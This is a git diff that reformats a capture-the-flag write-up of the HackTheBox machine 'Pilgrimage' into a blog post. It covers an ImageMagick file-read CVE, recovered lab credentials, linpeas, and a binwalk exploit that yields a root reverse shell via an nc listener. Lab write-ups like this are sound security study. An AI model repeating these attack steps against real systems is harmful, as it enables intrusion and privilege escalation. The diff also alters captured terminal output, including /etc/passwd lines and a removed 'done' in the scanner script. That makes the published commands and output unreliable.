@@ -1,5 +1,22 @@
-TARGET: 10.129.51.87
-ME: 10.10.15.8
++++
+date = '2026-09-03T22:40:35-04:00'
+draft = false
+title = 'Pilgrimage'
+author = 'Siddhant Singh'
++++
+
+Pilgrimage is a medium-rated Linux box on HackTheBox. The path is a neat Linux web-app chain: a vulnerable ImageMagick upload lets me read files from the server, recover the app database and the `emily` password, then abuse a root-run malware scanner that invokes an older `binwalk` binary with a command execution issue to get root.
+
+**Target:** `10.129.51.87`  
+**My IP:** `10.10.15.8`
+
+---
+
+## Enumeration
+
+### NMAP
+
+I started with a full-port scan and service fingerprinting to find the real attack surface before I touched the app:
 
 ```
 ┌──(xmen㉿kali)-[~]
@@ -24,15 +41,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 33.04 seconds
 ```
 
-# Port 80
+### Port 80
 
-Added pilgrimage.htb to hosts file and navigated to the website being served behind nginx 1.18.0
+Added `pilgrimage.htb` to the hosts file and navigated to the website being served behind nginx 1.18.0.
 
 This seems to be some kind of "free image shrinker" with an unauthenticated file upload for the image to be shrunk.
 
-There is a registration which allows for our  "shrunk" files to show up as links in a dashboard allowing going to them and reviewing past submissions.
+There is a registration which allows for our "shrunk" files to show up as links in a dashboard allowing going to them and reviewing past submissions.
 
-Running nmap again after adding the vHost saved me from having to run dirb as it seems the .git directory for this (what appears to be a git repo) is accessible. From here I should be able to reconstruct the filesystem and the PHP code for the submitted images to see how to upload a webshell.
+Running nmap again after adding the vHost saved me from having to run dirb as it seems the `.git` directory for this (what appears to be a git repo) is accessible. From here I should be able to reconstruct the filesystem and the PHP code for the submitted images to see how to upload a webshell.
 
 ```
 80/tcp open  http    nginx 1.18.0
@@ -50,11 +67,11 @@ Running nmap again after adding the vHost saved me from having to run dirb as it
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Reconstructing the files showed that an uploaded image is parsed by imageMagick and that appImage could be extracted into a file system for the FUSE userspace file system (appImage seems like a container in this sense).
+Reconstructing the files showed that an uploaded image is parsed by ImageMagick and that appImage could be extracted into a file system for the FUSE userspace file system (appImage seems like a container in this sense).
 
-So, by dumping the filesystem for the imageMagick binary (AppImage) I found the version number to be ImageMagick 7.1.0-49 which on some googling turned up CVE-2022-44268 which allows crafted jpegs to be "shrunk" into a jpeg containing whatever file we want read.
+So, by dumping the filesystem for the ImageMagick binary (AppImage) I found the version number to be **ImageMagick 7.1.0-49** which on some googling turned up **CVE-2022-44268** which allows crafted jpegs to be "shrunk" into a jpeg containing whatever file we want read.
 
-This allowed me to read /etc/passwd as a PoC using the exploit from [here](https://git.rotfl.io/v/CVE-2022-44268.git) (after installing rust):
+This allowed me to read `/etc/passwd` as a PoC using the exploit from [here](https://git.rotfl.io/v/CVE-2022-44268.git) (after installing rust):
 
 ```
 3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
@@ -62,12 +79,16 @@ This allowed me to read /etc/passwd as a PoC using the exploit from [here](https
 737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
 >>> print(bytes.fromhex(x))
-b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
+b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,/:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
 ```
 
-Now as seen in login.php from the dump:
+---
 
-```
+## Foothold — ImageMagick CVE-2022-44268
+
+Now as seen in `login.php` from the dump:
+
+```php
 ─$ cat login.php     
 <?php
 session_start();
@@ -87,24 +108,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
   ...
 ```
 
-The database seems to be a sqlite DB at /var/db/pilgrimage so extracting that with a new image file generated by the exploit yields:
+The database seems to be a sqlite DB at `/var/db/pilgrimage` so extracting that with a new image file generated by the exploit yields:
 
-```
+```bash
 ┌──(xmen㉿kali)-[~/imageMagick]
 └─$ cat sqlite                    
 ��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL,��▒-emilyabigchonkyboi123=indexsqlite_autoindex_users_1users
 ��      emily
 ```
 
-This means we have a password for the emily user from earlier in /etc/passwd:
+This means we have a password for the `emily` user from earlier in `/etc/passwd`:
 
-```
-emily : abigchonkyboi123
-```
+**Credentials:** `emily` / `abigchonkyboi123`
 
-From here I ran linpeas and something odd showed up as a custom script in the running processes, run by root:
+From here I ran `linpeas` and something odd showed up as a custom script in the running processes, run by root:
 
-```
+```bash
                 ╚════════════════════════════════════════════════╝                                                                                                                                                                          
 ╔══════════╣ Running processes (cleaned) (T1057)
 ╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                 
@@ -145,9 +164,9 @@ emily       1188  0.0  0.2  15164  8528 ?        Ss   12:12   0:00 /lib/systemd/
 emily       1189  0.0  0.0 101228  2544 ?        S    12:12   0:00  _ (sd-pam)
 ```
 
-This malwarescan.sh seemed like an odd one so I tried to check its perms and could actually read it however I could not modify it as the file was owned by root and I only had read privs outside the root group:
+This `malwarescan.sh` seemed like an odd one so I tried to check its perms and could actually read it however I could not modify it as the file was owned by root and I only had read privs outside the root group:
 
-```
+```bash
 emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
 #!/bin/bash
 
@@ -161,29 +180,28 @@ blacklist=("Executable script" "Microsoft executable")
                         /usr/bin/rm "$filename"
                         break
                 fi
-        done
 done
 ```
 
-The binaries used in this include inotifywait, binwalk, echo, tail, sed and rm. The only ones that stood out as unusual to me were inotifywait and binwalk so I checked versions of both:
+The binaries used in this include `inotifywait`, `binwalk`, `echo`, `tail`, `sed` and `rm`. The only ones that stood out as unusual to me were `inotifywait` and `binwalk` so I checked versions of both:
 
-```
+```bash
 emily@pilgrimage:~$ /usr/bin/inotifywait -h
 inotifywait 3.14
 Wait for a particular event on a file or set of files.
 ```
 
-```
+```bash
 emily@pilgrimage:~$ /usr/local/bin/binwalk -h
 
 Binwalk v2.3.2
 ```
 
-Here, I then ran searchsploit on both to see if any of these were interesting as neither was a SUID or SGUID binary and there didn't seem any way to edit the malwarescan.sh script besides that.
+Here, I then ran `searchsploit` on both to see if any of these were interesting as neither was a SUID or SGUID binary and there didn't seem any way to edit the `malwarescan.sh` script besides that.
 
-This showed that binwalk seems to have a code execution vuln:
+This showed that `binwalk` seems to have a code execution vuln:
 
-```
+```bash
 ─$ searchsploit binwalk                                 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                            |  Path
@@ -191,12 +209,11 @@ This showed that binwalk seems to have a code execution vuln:
 Binwalk v2.3.2 - Remote Command Execution (RCE)                                                                                                                                                           | python/remote/51249.py
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-
 ```
 
 Uploading the generated png from this exploit leads to a reverse shell as root:
 
-```
+```bash
 ┌──(xmen㉿kali)-[~]
 └─$ nc -lnvp 9000                                   
 listening on [any] 9000 ...
@@ -205,6 +222,24 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 whoami
 root
+==DONE==
 ```
 
-==DONE==
+---
+
+## Privilege Escalation — emily → root
+
+The fact that `malwarescan.sh` was running as root and invoking `binwalk` in an untrusted path was the real clue. `binwalk` itself was vulnerable, and it was being executed on files created in the `/var/www/pilgrimage.htb/shrunk/` directory. That meant I could get a root-owned shell by dropping a crafted file that triggered the vulnerable extraction routine.
+
+### binwalk RCE
+
+I generated the malicious PNG from the public exploit, uploaded it through the image shrinker, and the scanner executed the extraction path under the root user. The output above shows the shell landing as root immediately.
+
+---
+
+## Root
+
+```bash
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
